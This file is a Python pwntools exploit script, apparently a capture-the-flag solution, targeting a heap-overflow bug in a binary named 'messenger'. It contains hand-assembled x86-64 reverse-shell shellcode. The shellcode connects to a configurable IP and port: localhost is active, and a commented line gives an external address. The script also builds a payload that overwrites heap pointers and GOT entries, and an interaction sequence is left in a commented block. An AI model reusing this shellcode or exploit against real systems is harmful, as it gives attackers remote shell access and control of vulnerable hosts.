#!/usr/bin/python
from pwn import *
import time

#jmp = "\xe9\x9f\x2f\x20\x00"
#jmp = "\xff\x35\x78\x30\x60\x00\xc3"
push_ret = "\x68\x78\x30\x60\x00\xc3"
#shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

#IPADDR = "\x79\x87\x96\xd5"#121.135.150.213
IPADDR = "\x7f\x00\x00\x01"#127.0.0.1
PORT = "\x04\xd2"#1234
shellcode = "\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
shellcode += "\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0"
shellcode += "\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24"
shellcode += "\x02"+PORT+"\xc7\x44\x24\x04"+IPADDR+"\x48\x89\xe6\x6a\x10"
shellcode += "\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48"
shellcode += "\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a"
shellcode += "\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54"
shellcode += "\x5f\x6a\x3b\x58\x0f\x05";

payload = "L\x00\n"
payload += "32\n"
payload += "a"*31+"\n"
payload += "L\x00\n"
payload += "32\n"
payload += "b"*31+"\n"
payload += "C\x00\n"
payload += "0\n"
payload2 = push_ret+"A"*50 + p64(0x603030)+ p64(0x602018-0x8) + shellcode + "\n"
payload += str(len(payload2))+"\n"
payload += payload2
payload += "R\x00\n"
payload += "1\n"
print payload
'''
p = process("./messenger")

print p.recvuntil(">> ")
p.sendline("L")
print p.recvuntil("size : ")
p.sendline("32")
print p.recvuntil("msg : ")
p.sendline("aaaa")

print p.recvuntil(">> ")
p.sendline("L")
print p.recvuntil("size : ")
p.sendline("32")
print p.recvuntil("msg : ")
p.sendline("bbbb")


print p.recvuntil(">> ")
p.sendline("C")
print p.recvuntil("index : ")
p.sendline("0")
print p.recvuntil("size : ")
p.sendline("100")
print p.recvuntil("msg : ")
payload = "A"*56 + p64(0x602018) + p64(0x603030)
p.sendline(payload)


print p.recvuntil(">> ")
p.sendline("R")
print p.recvuntil("index : ")
p.sendline("0")
print p.recvuntil(">> ")





p.close()
'''
